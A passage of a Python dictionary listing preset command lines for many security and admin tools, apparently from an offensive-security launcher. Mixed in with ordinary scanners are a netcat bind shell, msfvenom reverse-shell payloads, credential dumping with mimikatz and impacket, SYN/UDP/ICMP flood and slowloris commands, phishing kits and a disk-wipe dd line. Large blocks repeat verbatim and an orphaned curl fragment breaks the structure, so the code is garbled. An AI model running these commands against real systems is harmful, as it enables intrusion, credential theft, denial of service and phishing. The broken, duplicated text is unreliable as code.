    "kubescape": [
        ("scan", "Full scan"),
        ("scan --include-namespaces dev,prod", "Specific namespaces"),
        ("scan framework nsa", "NSA framework"),
    ],
    "popeye": [
        ("-n dev", "Dev namespace"),
        ("--all-namespaces", "All namespaces"),
        ("-o json", "JSON output"),
    ],
    "checkov": [
        ("-d /terraform", "Terraform scan"),
        ("-d /kubernetes", "K8s scan"),
        ("-d / --framework all", "All frameworks"),
    ],
    "tfsec": [
        (".", "Current directory"),
        ("--format json .", "JSON output"),
        ("--exclude-downloaded-modules .", "Exclude modules"),
    ],
    "terrascan": [
        ("scan -d /terraform", "Scan directory"),
        ("scan -i terraform", "Terraform only"),
        ("scan -f output.json", "Output file"),
    ],
    "prowler": [
        ("-p custom-profile -r us-east-1", "AWS region"),
        ("-g securitygroup -n", "Security groups"),
        ("-M json -o output", "JSON output"),
    ],
    "scoutsuite": [
        ("aws --profile default", "AWS scan"),
        ("azure --cli", "Azure scan"),
        ("gcp --project-id my-project", "GCP scan"),
    ],
    "pacu": [
        ("--session mytest", "Create session"),
        ("--list-modules", "List modules"),
        ("--module-name iam__enum_users", "Run module"),
    ],
    "cloudmapper": [
        ("collect --account target", "Collect data"),
        ("report --account target", "Generate report"),
        ("webserver --account target", "Start web UI"),
    ],
    "lynis": [
        ("audit system", "System audit"),
        ("audit system --quick", "Quick scan"),
        ("audit system --pentest", "Pentest mode"),
    ],
    "chkrootkit": [
        ("-q", "Quiet mode"),
        ("-x", "Expert mode"),
    ],
    "rkhunter": [
        ("--check", "Full check"),
        ("--update", "Update database"),
        ("--sk", "Skip keypress"),
    ],
    "clamscan": [
        ("-r /", "Scan root"),
        ("-r --bell /home", "Alert on find"),
        ("-r --remove /tmp", "Auto remove"),
    ],
    "testdisk": [
        ("/dev/sda", "Analyze disk"),
        ("/dev/sda /log", "With log"),
    ],
    "photorec": [
        ("/dev/sda", "Recover from disk"),
        ("/d /recovery /dev/sda", "Output directory"),
    ],
    "foremost": [
        ("-i image.dd -o output/", "Carve files"),
        ("-t all -i image.dd -o output/", "All types"),
    ],
    "scalpel": [
        ("-c scalpel.conf image.dd -o output/", "With config"),
        ("image.dd -o output/", "Quick carve"),
    ],
    "bulk_extractor": [
        ("-o output/ image.dd", "Extract all"),
        ("-e email -o output/ image.dd", "Emails only"),
    ],
    "volatility3": [
        ("-f memory.dump windows.info", "System info"),
        ("-f memory.dump windows.pslist", "Process list"),
        ("-f memory.dump windows.netscan", "Network scan"),
        ("-f memory.dump windows.cmdline", "Command line"),
        ("-f memory.dump windows.malfind", "Malware find"),
    ],
    "apktool": [
        ("d app.apk", "Decompile"),
        ("b app/ -o new.apk", "Build"),
        ("d -f app.apk", "Force decompile"),
    ],
    "jadx": [
        ("app.apk", "Decompile"),
        ("-d output/ app.apk", "Output directory"),
        ("--deobf app.apk", "Deobfuscate"),
    ],
    "dex2jar": [
        ("classes.dex -o output.jar", "Convert DEX"),
        ("app.apk -o output.jar", "APK to JAR"),
    ],
    "androguard": [
        ("analyze app.apk", "Analyze"),
        ("-o output/ app.apk", "Output directory"),
    ],
    "ghidra": [
        ("-import binary.exe -postscript AnalyzeHeadless", "Import analyze"),
        ("-process binary.exe -scriptPath /scripts", "Custom scripts"),
    ],
    "radare2": [
        ("-A binary", "Auto analyze"),
        ("-d binary", "Debug mode"),
        ("-A -c 'afl' binary", "List functions"),
        ("-w binary", "Write mode"),
    ],
    "rizin": [
        ("-A binary", "Auto analyze"),
        ("-d binary", "Debug mode"),
    ],
    "objdump": [
        ("-d binary", "Disassemble"),
        ("-x binary", "All headers"),
        ("-t binary", "Symbol table"),
    ],
    "strace": [
        ("-f command", "Follow forks"),
        ("-c command", "Summary count"),
        ("-e trace=file command", "File operations"),
        ("-o output.log command", "Save to file"),
    ],
    "ltrace": [
        ("command", "Library calls"),
        ("-f command", "Follow forks"),
        ("-o output.log command", "Save to file"),
    ],
    "gdb": [
        ("-q binary", "Quiet start"),
        ("-ex 'run' -ex 'bt' binary", "Run and backtrace"),
        ("-p PID", "Attach to process"),
    ],



    # === FINAL PRE-BUILT EXAMPLES ===
    "netstat": [
        ("-tunap", "All connections"),
        ("-tlnp", "Listening ports"),
        ("-c", "Continuous mode"),
    ],
    "ss": [
        ("-tunap", "All connections"),
        ("-tlnp", "Listening ports"),
    ],
    "arp": [
        ("-a", "ARP table"),
        ("-d 192.168.1.1", "Delete entry"),
    ],
    "route": [
        ("-n", "Routing table"),
        ("add default gw 192.168.1.1", "Add gateway"),
    ],
    "iptables": [
        ("-L -n -v", "List rules"),
        ("-A INPUT -s IP -j DROP", "Block IP"),
        ("-A INPUT -p tcp --dport 80 -j ACCEPT", "Allow port 80"),
        ("-F", "Flush rules"),
    ],
    "ufw": [
        ("status", "Check status"),
        ("enable", "Enable firewall"),
        ("allow 80/tcp", "Allow port 80"),
        ("deny from IP", "Block IP"),
    ],
    "sysctl": [
        ("-a", "All settings"),
        ("net.ipv4.ip_forward=1", "Enable forwarding"),
    ],
    "mount": [
        ("-o ro,noexec /dev/sdb1 /mnt", "Read-only mount"),
        ("", "List mounts"),
    ],
    "dd": [
        ("if=/dev/sda of=image.dd bs=4M status=progress", "Disk image"),
        ("if=/dev/urandom of=file bs=1M count=100", "Random file"),
        ("if=/dev/zero of=/dev/sdb bs=1M", "Wipe disk"),
    ],
    "shred": [
        ("-n 7 -z file.txt", "7 pass shred"),
        ("-u file.txt", "Remove after"),
        ("-v file.txt", "Verbose"),
    ],
    "wipe": [
        ("-f file.txt", "Force wipe"),
        ("-r dir/", "Recursive wipe"),
    ],
    "srm": [
        ("-v file.txt", "Verbose secure delete"),
        ("-r dir/", "Recursive"),
    ],
    "openssl": [
        ("genrsa -out key.pem 2048", "Generate RSA key"),
        ("req -new -key key.pem -out csr.pem", "Generate CSR"),
        ("x509 -req -days 365 -in csr.pem -signkey key.pem -out cert.pem", "Self-sign cert"),
        ("s_client -connect target.com:443", "SSL connect"),
        ("enc -aes-256-cbc -in file.txt -out file.enc -pass pass:password", "Encrypt file"),
        ("enc -d -aes-256-cbc -in file.enc -out file.txt -pass pass:password", "Decrypt file"),
    ],
    "gpg": [
        ("--full-generate-key", "Generate key"),
        ("-c file.txt", "Symmetric encrypt"),
        ("-d file.gpg", "Decrypt"),
        ("--list-keys", "List keys"),
        ("--export -a user@email.com > public.key", "Export public key"),
    ],
    "base64": [
        ("file.txt", "Encode file"),
        ("-d file.b64", "Decode file"),
        ("-w 0 file.txt", "No line wrap"),
    ],
    "md5sum": [
        ("file.txt", "MD5 hash"),
        ("-c checksum.md5", "Check hashes"),
    ],
    "sha256sum": [
        ("file.txt", "SHA256 hash"),
        ("-c checksum.sha256", "Check hashes"),
    ],
    "zip": [
        ("archive.zip file1 file2", "Create archive"),
        ("-r archive.zip dir/", "Recursive"),
        ("-P password archive.zip file", "With password"),
        ("-e archive.zip file", "Encrypt"),
    ],
    "unzip": [
        ("archive.zip", "Extract"),
        ("-P password archive.zip", "Password extract"),
        ("archive.zip -d /output/", "Output directory"),
    ],
    "tar": [
        ("-czf archive.tar.gz dir/", "Create gzip"),
        ("-xzf archive.tar.gz", "Extract gzip"),
        ("-cjf archive.tar.bz2 dir/", "Create bzip2"),
    ],
    "wget": [
        ("https://target.com/file.txt", "Download"),
        ("-r -np -k https://target.com", "Mirror site"),
        ("-O output.txt https://target.com", "Save as"),
        ("--user-agent='Mozilla/5.0' https://target.com", "Custom UA"),
    ],
    "git": [
        ("clone https://github.com/user/repo.git", "Clone repo"),
        ("clone --depth 1 https://github.com/user/repo.git", "Shallow clone"),
        ("log --oneline", "Commit history"),
        ("diff", "Show changes"),
    ],
    "python3": [
        ("-m http.server 8080", "HTTP server"),
        ("-c 'print("hello")'", "One-liner"),
        ("script.py", "Run script"),
    ],
    "pip": [
        ("install package", "Install package"),
        ("install -r requirements.txt", "Install from file"),
        ("list", "List installed"),
        ("freeze > requirements.txt", "Export list"),
    ],
    "go": [
        ("build main.go", "Build binary"),
        ("run main.go", "Run without build"),
        ("install github.com/tool/cmd@latest", "Install tool"),
    ],
    "gem": [
        ("install package", "Install gem"),
        ("list", "List gems"),
    ],
    "npm": [
        ("install package", "Install package"),
        ("install -g package", "Global install"),
        ("start", "Start project"),
    ],
    "docker": [
        ("ps -a", "List containers"),
        ("images", "List images"),
        ("run -it ubuntu bash", "Run interactive"),
        ("build -t name .", "Build image"),
        ("exec -it container bash", "Exec into container"),
    ],
    "kubectl": [
        ("get pods", "List pods"),
        ("get pods --all-namespaces", "All namespaces"),
        ("get nodes", "List nodes"),
        ("exec -it pod -- bash", "Exec into pod"),
        ("apply -f deployment.yaml", "Apply config"),
        ("delete pod name", "Delete pod"),
    ],
    "terraform": [
        ("init", "Initialize"),
        ("plan", "Plan changes"),
        ("apply -auto-approve", "Apply changes"),
        ("destroy -auto-approve", "Destroy resources"),
    ],
    "ansible": [
        ("all -m ping", "Ping all hosts"),
        ("webservers -m command -a 'uptime'", "Run command"),
        ("-i inventory playbook.yml", "Run playbook"),
    ],
    "ssh": [
        ("user@host", "Basic connect"),
        ("-p 2222 user@host", "Custom port"),
        ("-i key.pem user@host", "Key auth"),
        ("-L 8080:localhost:80 user@host", "Local forward"),
        ("-R 8080:localhost:80 user@host", "Remote forward"),
        ("-D 1080 user@host", "SOCKS proxy"),
    ],
    "scp": [
        ("file.txt user@host:/path/", "Copy to remote"),
        ("user@host:/path/file.txt .", "Copy from remote"),
        ("-r dir/ user@host:/path/", "Recursive"),
    ],
    "rsync": [
        ("-av dir/ user@host:/path/", "Sync to remote"),
        ("-av user@host:/path/ dir/", "Sync from remote"),
        ("-av --delete dir/ /backup/", "Mirror sync"),
    ],
    "screen": [
        ("-S session_name", "Named session"),
        ("-r session_name", "Reattach"),
        ("-ls", "List sessions"),
    ],
    "tmux": [
        ("new -s session_name", "New session"),
        ("attach -t session_name", "Attach"),
        ("ls", "List sessions"),
    ],
    "htop": [
        ("", "Interactive process viewer"),
        ("-u username", "Filter user"),
    ],
    "iftop": [
        ("-i wlan0", "Interface traffic"),
        ("-P", "Show ports"),
    ],
    "nethogs": [
        ("wlan0", "Interface bandwidth"),
        ("-d 5 wlan0", "5s refresh"),
    ],
    "vnstat": [
        ("-i wlan0", "Interface stats"),
        ("-d", "Daily stats"),
        ("-m", "Monthly stats"),
    ],

        ("-H Content-Type: application/json https://target.com/api", "JSON API"),
        ("-x http://proxy:8080 https://target.com", "Via proxy"),
        ("-k https://target.com", "Ignore SSL errors"),
        ("-u admin:password https://target.com", "Basic auth"),
    ],
    "wpscan": [
        ("--url http://target.com", "Basic scan"),
        ("--url http://target.com --enumerate p", "Enumerate plugins"),
        ("--url http://target.com --enumerate t", "Enumerate themes"),
        ("--url http://target.com --enumerate u", "Enumerate users"),
        ("--url http://target.com --passwords pass.txt --usernames admin", "Password brute"),
        ("--url http://target.com --api-token YOUR_TOKEN", "With API token"),
    ],
    "nikto": [
        ("-h http://target.com", "Basic scan"),
        ("-h https://target.com -ssl", "SSL scan"),
        ("-h http://target.com -Tuning 1", "Interesting files"),
        ("-h http://target.com -Tuning x", "XSS checks"),
        ("-h http://target.com -o report.html -Format htm", "HTML report"),
    ],
    "dirb": [
        ("http://target.com", "Basic scan"),
        ("http://target.com /usr/share/wordlists/dirb/big.txt", "Big wordlist"),
        ("https://target.com -w", "HTTPS no warnings"),
        ("http://target.com -X .php,.html,.txt", "With extensions"),
        ("http://target.com -u admin:password", "Basic auth"),
    ],
    "aircrack-ng": [
        ("-w rockyou.txt capture.cap", "Dictionary crack"),
        ("-b 00:11:22:33:44:55 capture.cap", "Target specific BSSID"),
        ("-a 2 -w rockyou.txt capture.cap", "WPA2 crack"),
        ("-a 1 capture.cap", "WEP crack"),
    ],
    "tcpdump": [
        ("-i any port 80", "HTTP traffic"),
        ("-i any host 192.168.1.1", "Specific host"),
        ("-i wlan0 -w capture.pcap", "Save to file"),
        ("-i any -n port not 22", "All except SSH"),
    ],
    "netcat": [
        ("-lvp 4444", "Listen on port 4444"),
        ("-e /bin/bash -lvp 4444", "Bind shell"),
        ("target.com 80", "Connect to port 80"),
        ("-zv target.com 1-1000", "Port scan"),
    ],
    "exiftool": [
        ("image.jpg", "Read metadata"),
        ("-a -G1 image.jpg", "All metadata"),
        ("-all= image.jpg", "Remove all metadata"),
        ("-Comment='Test' image.jpg", "Add comment"),
    ],
    "binwalk": [
        ("firmware.bin", "Scan file"),
        ("-e firmware.bin", "Extract files"),
        ("-Me firmware.bin", "Recursive extract"),
    ],
    "steghide": [
        ("embed -cf cover.jpg -ef secret.txt", "Embed file"),
        ("extract -sf stego.jpg", "Extract file"),
        ("embed -cf cover.jpg -ef secret.txt -p password", "With password"),
    ],
    "bettercap": [
        ("-iface wlan0", "Start on WiFi"),
        ("-eval 'net.probe on'", "Network probe"),
        ("-eval 'wifi.recon on'", "WiFi recon"),
        ("-eval 'net.sniff on'", "Packet sniffing"),
    ],
    "msfconsole": [
        ("-q", "Quiet start"),
        ("-x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'", "Reverse handler"),
        ("-x 'db_nmap -sV target.com'", "Nmap from MSF"),
    ],
    "msfvenom": [
        ("-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe", "Windows reverse"),
        ("-p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk", "Android payload"),
        ("-p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf", "Linux reverse"),
        ("-p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php", "PHP reverse"),
        ("-l payloads", "List all payloads"),
    ],
    "sherlock": [
        ("username", "Search username"),
        ("username --output results/ --csv", "Save results CSV"),
        ("username --site twitter,instagram,facebook", "Specific sites"),
        ("username --timeout 5", "Fast timeout"),
    ],
    "theHarvester": [
        ("-d target.com -b google", "Google search"),
        ("-d target.com -b all", "All sources"),
        ("-d target.com -b linkedin", "LinkedIn search"),
        ("-d target.com -b google -f report.html", "Save HTML"),
    ],
    "zphisher": [
        ("-p -t -o", "Interactive mode"),
        ("--ngrok", "Ngrok tunnel"),
        ("--cloudflared", "Cloudflare tunnel"),
    ],
    "evilginx2": [
        ("-p o365 -t target.com", "Office365 phishlet"),
        ("-p google -t target.com", "Google phishlet"),
        ("-p linkedin -t target.com", "LinkedIn phishlet"),
    ],
    "gophish": [
        ("--port 3333", "Start on port 3333"),
        ("--config config.json", "With config"),
    ],



    # === MORE PRE-BUILT EXAMPLES ===
    "masscan": [
        ("-p80,443 192.168.1.0/24 --rate=1000", "Web ports fast"),
        ("-p1-65535 target.com --rate=5000", "All ports fast"),
        ("-p22,80,443,8080,8443 target.com", "Common ports"),
        ("-p- target.com --rate=10000", "Full port max speed"),
        ("-p80,443 192.168.1.0/24 -oJ scan.json", "JSON output"),
    ],
    "rustscan": [
        ("-a target.com", "Fast scan"),
        ("-a target.com -p 1-1000", "Port range"),
        ("-a target.com --ulimit 5000 -t 2000", "Max speed"),
        ("-a 192.168.1.0/24 -p 22,80,443", "Network scan"),
    ],
    "amass": [
        ("enum -d target.com", "Basic enum"),
        ("enum -passive -d target.com", "Passive only"),
        ("enum -active -d target.com", "Active enum"),
        ("enum -d target.com -o output.txt", "Save output"),
        ("intel -d target.com", "Intelligence gather"),
    ],
    "subfinder": [
        ("-d target.com", "Basic subdomain"),
        ("-d target.com -silent", "Silent mode"),
        ("-d target.com -o subs.txt", "Save to file"),
        ("-dL domains.txt -o all_subs.txt", "Bulk domains"),
    ],
    "httpx": [
        ("-l subs.txt -o live.txt", "Check live hosts"),
        ("-l subs.txt -status-code -title", "Status and title"),
        ("-l subs.txt -tech-detect", "Tech detection"),
        ("-l subs.txt -silent -o live.txt", "Silent output"),
    ],
    "nuclei": [
        ("-u http://target.com", "Basic scan"),
        ("-u http://target.com -severity critical,high", "Critical/High only"),
        ("-l targets.txt -t cves/", "CVE templates"),
        ("-u http://target.com -t exposures/", "Exposure scan"),
        ("-u http://target.com -o report.txt", "Save report"),
    ],
    "wapiti": [
        ("-u http://target.com", "Basic scan"),
        ("-u http://target.com --scope page", "Page scope"),
        ("-u http://target.com -f txt -o report", "TXT report"),
    ],
    "skipfish": [
        ("-o /tmp/output http://target.com", "Basic scan"),
        ("-o /tmp/output -I target.com http://target.com", "Target only"),
    ],
    "testssl": [
        ("https://target.com", "Full test"),
        ("--each-cipher https://target.com", "Each cipher"),
        ("--json https://target.com", "JSON output"),
        ("--parallel https://target.com", "Fast parallel"),
    ],
    "sslyze": [
        ("--regular target.com", "Regular scan"),
        ("--json_out out.json target.com", "JSON output"),
    ],
    "responder": [
        ("-I eth0", "Start on eth0"),
        ("-I wlan0 -rdwv", "Full mode WiFi"),
        ("-I eth0 -A", "Analyze mode"),
    ],
    "impacket": [
        ("psexec.py domain/user:pass@target", "PSExec"),
        ("wmiexec.py domain/user:pass@target", "WMIExec"),
        ("smbexec.py domain/user:pass@target", "SMBExec"),
        ("secretsdump.py domain/user:pass@target", "Dump secrets"),
        ("ntlmrelayx.py -t smb://target -smb2support", "NTLM relay"),
    ],
    "crackmapexec": [
        ("smb target -u user -p pass", "SMB check"),
        ("smb 192.168.1.0/24 -u user -p pass --shares", "Network shares"),
        ("winrm target -u user -p pass -x 'whoami'", "WinRM exec"),
        ("mssql target -u sa -p password", "MSSQL check"),
    ],
    "bloodhound": [
        ("-d domain -u user -p pass -ns nameserver -c all", "Full collection"),
        ("-d domain -u user -p pass -ns nameserver", "Basic collection"),
    ],
    "mimikatz": [
        ("privilege::debug sekurlsa::logonpasswords", "Dump passwords"),
        ("lsadump::sam", "Dump SAM"),
        ("lsadump::secrets", "Dump secrets"),
        ("token::elevate", "Elevate token"),
    ],
    "chisel": [
        ("server -p 8080 --reverse", "Server reverse"),
        ("client server:8080 R:4444:localhost:4444", "Client reverse"),
    ],
    "ligolo": [
        ("-bind 0.0.0.0:11601", "Start proxy"),
        ("-connect proxy:11601 -ignore-cert", "Connect agent"),
    ],
    "proxychains": [
        ("nmap -sT target.com", "Nmap via proxy"),
        ("curl target.com", "Curl via proxy"),
        ("firefox", "Browser via proxy"),
    ],
    "torify": [
        ("nmap -sT target.com", "Nmap via Tor"),
        ("curl target.com", "Curl via Tor"),
    ],
    "wifite": [
        ("-i wlan0", "Basic scan"),
        ("-i wlan0 --wpa", "WPA only"),
        ("-i wlan0 --wep", "WEP only"),
        ("-i wlan0 --kill", "Kill interfering"),
    ],
    "reaver": [
        ("-i wlan0mon -b BSSID -vv", "WPS attack"),
        ("-i wlan0mon -b BSSID -c 6 -vv", "Specific channel"),
    ],
    "kismet": [
        ("-c wlan0", "Start capture"),
        ("-c wlan0 --no-server", "No web server"),
    ],
    "hping3": [
        ("-S target.com -p 80 --flood", "SYN flood"),
        ("--udp target.com -p 53 --flood", "UDP flood"),
        ("-1 target.com --flood", "ICMP flood"),
        ("-S target.com -p 80 --rand-source", "Random source SYN"),
    ],
    "slowloris": [
        ("-p 80 target.com", "HTTP slow"),
        ("-p 443 --https target.com", "HTTPS slow"),
        ("-s 500 target.com", "500 sockets"),
    ],
    "ab": [
        ("-n 1000 -c 100 http://target.com/", "1000 requests 100 concurrent"),
        ("-n 10000 -c 200 -t 30 http://target.com/", "30s stress test"),
    ],
    "siege": [
        ("-c 100 -t 30s http://target.com", "100 users 30s"),
        ("-c 200 -r 50 http://target.com", "200 users 50 reps"),
        ("-f urls.txt", "URL list file"),
    ],



    # === EVEN MORE PRE-BUILT EXAMPLES ===
    "burpsuite": [
        ("--project=project.burp", "Open project"),
        ("--config=config.json", "Load config"),
        ("--collaborator-server", "Start collaborator"),
        ("--unpause-spidering", "Resume spider"),
    ],
    "zaproxy": [
        ("-cmd -quickurl http://target.com", "Quick scan"),
        ("-daemon -port 8080", "Daemon mode"),
        ("-cmd -quickurl http://target.com -quickout report.html", "Quick with report"),
    ],
    "commix": [
        ("-u http://target.com/page.php?id=1", "Basic test"),
        ("-u http://target.com/page.php?id=1 --os=unix", "Unix target"),
        ("-u http://target.com/page.php?id=1 --technique=t", "Time-based"),
    ],
    "xsser": [
        ("-u http://target.com/page.php?q=test", "Basic XSS"),
        ("--auto -u http://target.com/page.php?q=test", "Auto mode"),
        ("-u http://target.com/page.php?q=test --Fp", "Final payload"),
    ],
    "xsstrike": [
        ("-u http://target.com/page.php?q=test", "Basic scan"),
        ("-u http://target.com/page.php?q=test --crawl", "Crawl mode"),
        ("-u http://target.com/page.php?q=test --fuzzer", "Fuzzer mode"),
        ("-u http://target.com/page.php?q=test --blind", "Blind XSS"),
    ],
    "dalfox": [
        ("url http://target.com/page.php?q=test", "Basic scan"),
        ("url http://target.com/page.php?q=test --cookie 'session=xxx'", "With cookie"),
        ("file urls.txt", "Bulk URLs"),
    ],
    "nosqlmap": [
        ("-u http://target.com/api", "Basic scan"),
        ("-u http://target.com/api --mongodb", "MongoDB target"),
        ("-u http://target.com/api --dump", "Dump data"),
    ],
    "arjun": [
        ("-u http://target.com/page.php", "Find params"),
        ("-u http://target.com/page.php -t 20", "20 threads"),
        ("-u http://target.com/api --json", "JSON output"),
    ],
    "paramspider": [
        ("-d target.com", "Domain scan"),
        ("-d target.com -o output.txt", "Save output"),
    ],
    "kiterunner": [
        ("scan http://target.com -w routes.kite", "API scan"),
        ("discover http://target.com -w routes.kite", "Discover mode"),
    ],
    "feroxbuster": [
        ("-u http://target.com -w wordlist.txt", "Directory brute"),
        ("-u http://target.com -w wordlist.txt -t 100", "100 threads"),
        ("-u http://target.com -w wordlist.txt -x php,html,txt", "Extensions"),
    ],
    "dirsearch": [
        ("-u http://target.com -w wordlist.txt", "Directory scan"),
        ("-u http://target.com -e php,html,txt -t 50", "Extensions"),
        ("-u http://target.com --json-report report.json", "JSON report"),
    ],
    "trivy": [
        ("image nginx:latest", "Scan image"),
        ("fs /", "Filesystem scan"),
        ("repo https://github.com/user/repo", "Repo scan"),
        ("--severity CRITICAL,HIGH image nginx:latest", "Critical only"),
    ],
    "grype": [
        ("nginx:latest", "Scan image"),
        ("dir:/app", "Directory scan"),
        ("-o json nginx:latest", "JSON output"),
    ],
    "dockle": [
        ("nginx:latest", "Check image"),
        ("--ignore CIS-DI-0001 nginx:latest", "Ignore check"),
    ],
    "hadolint": [
        ("Dockerfile", "Lint Dockerfile"),
        ("--ignore DL3008 Dockerfile", "Ignore rule"),
    ],
    "clair": [
        ("--config config.yaml", "With config"),
        ("--ip 0.0.0.0 --port 6060", "Custom port"),
    ],
    "kube-hunter": [
        ("--remote target.com", "Remote scan"),
        ("--active", "Active hunting"),
        ("--pod", "Inside pod"),
        ("--cidr 192.168.1.0/24", "Network range"),
    ],
    "kube-bench": [
        ("--config-dir /etc/kubernetes", "Config dir"),
        ("--version 1.20", "K8s version"),
        ("--check 1.1.1", "Single check"),
    ],
    "kubescape": [
        ("scan", "Full scan"),
        ("scan --include-namespaces dev,prod", "Specific namespaces"),
        ("scan framework nsa", "NSA framework"),
    ],
    "popeye": [
        ("-n dev", "Dev namespace"),
        ("--all-namespaces", "All namespaces"),
        ("-o json", "JSON output"),
    ],
    "checkov": [
        ("-d /terraform", "Terraform scan"),
        ("-d /kubernetes", "K8s scan"),
        ("-d / --framework all", "All frameworks"),
    ],
    "tfsec": [
        (".", "Current directory"),
        ("--format json .", "JSON output"),
        ("--exclude-downloaded-modules .", "Exclude modules"),
    ],
    "terrascan": [
        ("scan -d /terraform", "Scan directory"),
        ("scan -i terraform", "Terraform only"),
        ("scan -f output.json", "Output file"),
    ],
    "prowler": [
        ("-p custom-profile -r us-east-1", "AWS region"),
        ("-g securitygroup -n", "Security groups"),
        ("-M json -o output", "JSON output"),
    ],
    "scoutsuite": [
        ("aws --profile default", "AWS scan"),
        ("azure --cli", "Azure scan"),
        ("gcp --project-id my-project", "GCP scan"),
    ],
    "pacu": [
        ("--session mytest", "Create session"),
        ("--list-modules", "List modules"),
        ("--module-name iam__enum_users", "Run module"),
    ],
    "cloudmapper": [
        ("collect --account target", "Collect data"),
        ("report --account target", "Generate report"),
        ("webserver --account target", "Start web UI"),
    ],
    "lynis": [
        ("audit system", "System audit"),
        ("audit system --quick", "Quick scan"),
        ("audit system --pentest", "Pentest mode"),
    ],
    "chkrootkit": [
        ("-q", "Quiet mode"),
        ("-x", "Expert mode"),
    ],
    "rkhunter": [
        ("--check", "Full check"),
        ("--update", "Update database"),
        ("--sk", "Skip keypress"),
    ],
    "clamscan": [
        ("-r /", "Scan root"),
        ("-r --bell /home", "Alert on find"),
        ("-r --remove /tmp", "Auto remove"),
    ],
    "testdisk": [
        ("/dev/sda", "Analyze disk"),
        ("/dev/sda /log", "With log"),
    ],
    "photorec": [
        ("/dev/sda", "Recover from disk"),
        ("/d /recovery /dev/sda", "Output directory"),
    ],
    "foremost": [
        ("-i image.dd -o output/", "Carve files"),
        ("-t all -i image.dd -o output/", "All types"),
    ],
    "scalpel": [
        ("-c scalpel.conf image.dd -o output/", "With config"),
        ("image.dd -o output/", "Quick carve"),
    ],
    "bulk_extractor": [
        ("-o output/ image.dd", "Extract all"),
        ("-e email -o output/ image.dd", "Emails only"),
    ],
    "volatility3": [
        ("-f memory.dump windows.info", "System info"),
        ("-f memory.dump windows.pslist", "Process list"),
        ("-f memory.dump windows.netscan", "Network scan"),
        ("-f memory.dump windows.cmdline", "Command line"),
        ("-f memory.dump windows.malfind", "Malware find"),
    ],
    "apktool": [
        ("d app.apk", "Decompile"),
        ("b app/ -o new.apk", "Build"),
        ("d -f app.apk", "Force decompile"),
    ],
    "jadx": [
        ("app.apk", "Decompile"),
        ("-d output/ app.apk", "Output directory"),
        ("--deobf app.apk", "Deobfuscate"),
    ],
    "dex2jar": [
        ("classes.dex -o output.jar", "Convert DEX"),
        ("app.apk -o output.jar", "APK to JAR"),
    ],
    "androguard": [
        ("analyze app.apk", "Analyze"),
        ("-o output/ app.apk", "Output directory"),
    ],
    "ghidra": [
        ("-import binary.exe -postscript AnalyzeHeadless", "Import analyze"),
        ("-process binary.exe -scriptPath /scripts", "Custom scripts"),
    ],
    "radare2": [
        ("-A binary", "Auto analyze"),
        ("-d binary", "Debug mode"),
        ("-A -c 'afl' binary", "List functions"),
        ("-w binary", "Write mode"),
    ],
    "rizin": [
        ("-A binary", "Auto analyze"),
        ("-d binary", "Debug mode"),
    ],
    "objdump": [
        ("-d binary", "Disassemble"),
        ("-x binary", "All headers"),
        ("-t binary", "Symbol table"),
    ],
    "strace": [
        ("-f command", "Follow forks"),
        ("-c command", "Summary count"),
        ("-e trace=file command", "File operations"),
        ("-o output.log command", "Save to file"),
    ],
    "ltrace": [
        ("command", "Library calls"),
        ("-f command", "Follow forks"),
        ("-o output.log command", "Save to file"),
    ],
    "gdb": [
        ("-q binary", "Quiet start"),
        ("-ex 'run' -ex 'bt' binary", "Run and backtrace"),
        ("-p PID", "Attach to process"),
    ],



    # === FINAL PRE-BUILT EXAMPLES ===
    "netstat": [
        ("-tunap", "All connections"),
        ("-tlnp", "Listening ports"),
        ("-c", "Continuous mode"),
    ],
    "ss": [
        ("-tunap", "All connections"),
        ("-tlnp", "Listening ports"),
    ],
    "arp": [
        ("-a", "ARP table"),
        ("-d 192.168.1.1", "Delete entry"),
    ],
    "route": [
        ("-n", "Routing table"),
        ("add default gw 192.168.1.1", "Add gateway"),
    ],
    "iptables": [
        ("-L -n -v", "List rules"),
        ("-A INPUT -s IP -j DROP", "Block IP"),
        ("-A INPUT -p tcp --dport 80 -j ACCEPT", "Allow port 80"),
        ("-F", "Flush rules"),
    ],
    "ufw": [
        ("status", "Check status"),
        ("enable", "Enable firewall"),
        ("allow 80/tcp", "Allow port 80"),
        ("deny from IP", "Block IP"),
    ],
    "sysctl": [
        ("-a", "All settings"),
        ("net.ipv4.ip_forward=1", "Enable forwarding"),
    ],
    "mount": [
        ("-o ro,noexec /dev/sdb1 /mnt", "Read-only mount"),
        ("", "List mounts"),
    ],
    "dd": [
        ("if=/dev/sda of=image.dd bs=4M status=progress", "Disk image"),
        ("if=/dev/urandom of=file bs=1M count=100", "Random file"),
        ("if=/dev/zero of=/dev/sdb bs=1M", "Wipe disk"),
    ],
    "shred": [
        ("-n 7 -z file.txt", "7 pass shred"),
        ("-u file.txt", "Remove after"),
        ("-v file.txt", "Verbose"),
    ],
    "wipe": [
        ("-f file.txt", "Force wipe"),
        ("-r dir/", "Recursive wipe"),
    ],
    "srm": [
        ("-v file.txt", "Verbose secure delete"),
        ("-r dir/", "Recursive"),
    ],
    "openssl": [
        ("genrsa -out key.pem 2048", "Generate RSA key"),
        ("req -new -key key.pem -out csr.pem", "Generate CSR"),
        ("x509 -req -days 365 -in csr.pem -signkey key.pem -out cert.pem", "Self-sign cert"),
        ("s_client -connect target.com:443", "SSL connect"),
        ("enc -aes-256-cbc -in file.txt -out file.enc -pass pass:password", "Encrypt file"),
        ("enc -d -aes-256-cbc -in file.enc -out file.txt -pass pass:password", "Decrypt file"),
    ],
    "gpg": [
        ("--full-generate-key", "Generate key"),
        ("-c file.txt", "Symmetric encrypt"),
        ("-d file.gpg", "Decrypt"),
        ("--list-keys", "List keys"),
        ("--export -a user@email.com > public.key", "Export public key"),
    ],
    "base64": [
        ("file.txt", "Encode file"),
        ("-d file.b64", "Decode file"),
        ("-w 0 file.txt", "No line wrap"),
    ],
    "md5sum": [
        ("file.txt", "MD5 hash"),
        ("-c checksum.md5", "Check hashes"),
    ],
    "sha256sum": [
        ("file.txt", "SHA256 hash"),
        ("-c checksum.sha256", "Check hashes"),
    ],
    "zip": [
        ("archive.zip file1 file2", "Create archive"),
        ("-r archive.zip dir/", "Recursive"),
        ("-P password archive.zip file", "With password"),
